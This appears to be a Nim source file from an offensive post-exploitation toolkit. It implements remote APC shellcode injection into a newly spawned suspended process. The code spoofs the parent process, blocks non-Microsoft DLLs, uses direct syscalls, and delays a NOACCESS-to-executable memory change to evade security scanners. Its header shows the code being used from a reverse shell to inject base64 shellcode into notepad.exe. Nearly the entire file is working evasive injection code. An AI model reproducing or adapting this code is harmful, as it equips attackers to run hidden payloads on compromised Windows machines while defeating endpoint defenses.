#[
  - Remote APC injection:
      Start/Suspend given binary under PPID of processes name set in the reverse shell
        -> Alloc(RW) -> Write -> NtQueueApcThread -> Protect(PAGE_NOACECSS) -> DelayExec -> Protect(RX) -> Resume

    - Example usage:
        .\converter sc.bin
        [LP_SHELL] > inject C:\\Windows\\notepad.exe ZmM0ODgxZTRmMGZmZm[..snip..]MjJlNjQ2YzZjMDA=

  References/Credit:
    https://github.com/ajpc500/NimExamples/blob/main/src/SysCallsMessageBoxshellCodeQueueUserremApcInject.nim
    https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/
    https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
    https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_callback_bin.nim
]#

import nimvoke/syscalls
import nimvoke/dinvoke

from util import convertSeconds
from processes import findTargetProc 
from winim/lean import TRUE, DWORD, DWORD64, SIZE_T, HANDLE, CLIENT_ID, PVOID, LPVOID, WINBOOL, NULL, NTSTATUS, LARGE_INTEGER, 
                       BOOLEAN, LPCWSTR, LPWSTR, LPSTARTUPINFOW, OBJECT_ATTRIBUTES, STARTUPINFOEX, PROCESS_INFORMATION, SECURITY_ATTRIBUTES, 
                       PROCESS_ALL_ACCESS, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, CREATE_NO_WINDOW, LPSECURITY_ATTRIBUTES, LPPROCESS_INFORMATION,
                       EXTENDED_STARTUPINFO_PRESENT, DETACHED_PROCESS, CREATE_SUSPENDED, MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, 
                       PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, PAGE_NOACCESS, LPPROC_THREAD_ATTRIBUTE_LIST, 
                       StartupInfo, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList, UpdateProcThreadAttribute, `&`

type
  KNORMAL_ROUTINE* {.pure.} = object
    NormalContext: PVOID
    SystemArgument1: PVOID
    SystemArgument2: PVOID
  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE

var 
  alertable: BOOLEAN = 0
  delayInterval: LARGE_INTEGER
  rxDelay: int64 = 70 # VProtect to RX delay time in seconds

dinvokeDefine(
  NtDelayExecution,
  "ntdll.dll",
  proc (Alertable: BOOLEAN, DelayInterval: ptr LARGE_INTEGER): NTSTATUS {.stdcall.}
)

dinvokeDefine(
  CreateProcessW,
  "kernel32.dll",
  proc (lpApplicationName: LPCWSTR,
        lpCommandLine: LPWSTR,
        lpProcessAttributes: LPSECURITY_ATTRIBUTES,
        lpThreadAttributes: LPSECURITY_ATTRIBUTES,
        bInheritHandles: WINBOOL,
        dwCreationFlags: DWORD,
        lpEnvironment: LPVOID,
        lpCurrentDirectory: LPCWSTR,
        lpStartupInfo: LPSTARTUPINFOW,
        lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}
)

dinvokeDefine(
  HeapAlloc,
  "kernel32.dll",
  proc (hHeap: HANDLE, dwFlags: DWORD, dwBytes: SIZE_T): LPVOID {.stdcall.})

dinvokeDefine(GetProcessHeap, "kernel32.dll", proc (): HANDLE {.stdcall.})

const
  PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000

proc remApcInj*(shellCode: openArray[byte], procToStart: string, parentProc: string): void =
  var
    suInfo: STARTUPINFOEX
    procInfo: PROCESS_INFORMATION
    pSecurityAttribtues: SECURITY_ATTRIBUTES
    tSecurityAttributes: SECURITY_ATTRIBUTES
    policy: DWORD64
    lpSize: SIZE_T
    res: WINBOOL
    hProcess: HANDLE
    hThread: HANDLE
    dest: LPVOID
    scSize: SIZE_T = cast[SIZE_T](shellCode.len)

  suInfo.StartupInfo.cb = sizeof(suInfo).cint
  pSecurityAttribtues.nLength = sizeof(pSecurityAttribtues).cint
  tSecurityAttributes.nLength = sizeof(tSecurityAttributes).cint

  InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
  suInfo.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
  InitializeProcThreadAttributeList(suInfo.lpAttributeList, 2, 0, addr lpSize)

  policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
  res = UpdateProcThreadAttribute(
    suInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, addr policy, sizeof(policy), NULL, NULL
  )

  suInfo.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT
  DeleteProcThreadAttributeList(suInfo.lpAttributeList)

  var status = 0
  var ppid = findTargetProc(parentProc)

  var clientID: CLIENT_ID
  var objAttr: OBJECT_ATTRIBUTES
  var hParent: HANDLE

  clientID.UniqueProcess = ppid
  status = syscall(NtOpenProcess, &hParent, PROCESS_ALL_ACCESS, &objAttr, &clientID)
  if status != 0: return

  res = UpdateProcThreadAttribute(
    suInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, addr hParent, sizeof(hParent), NULL, NULL
  )

  res = CreateProcessW(
      NULL,
      procToStart,
      addr pSecurityAttribtues,
      addr tSecurityAttributes, 
      TRUE,
      CREATE_SUSPENDED or DETACHED_PROCESS or CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT,
      NULL,
      NULL,
      addr suInfo.StartupInfo,
      addr procInfo
  )

  hProcess = procInfo.hProcess
  hThread = procInfo.hThread

  status = syscall(NtAllocateVirtualMemory, hProcess, &dest, 0, &scSize, MEM_COMMIT, PAGE_READWRITE)
  if status != 0: return

  var bytesWritten: SIZE_T
  status = syscall(NtWriteVirtualMemory, hProcess, dest, shellcode, scSize-1, addr bytesWritten)
  if status != 0: return

  var oldprotect: DWORD = 0
  status = syscall(NtQueueApcThread, hThread, cast[PKNORMAL_ROUTINE](dest), dest, NULL, NULL)
  if status != 0: return

  status = syscall(NtProtectVirtualMemory, hProcess, &dest, &scSize, PAGE_NOACCESS, &oldprotect)
  if status != 0: return

  delayInterval.QuadPart = -convertSeconds(rxDelay)
  status = NtDelayExecution(alertable, addr(delayInterval))

  status = syscall(NtProtectVirtualMemory, hProcess, &dest, &scSize, PAGE_EXECUTE_READ, &oldprotect)
  if status != 0: return

  status = syscall(NtAlertResumeThread, hThread, NULL)
  status = syscall(NtClose, hThread)
  status = syscall(NtClose, hProcess)
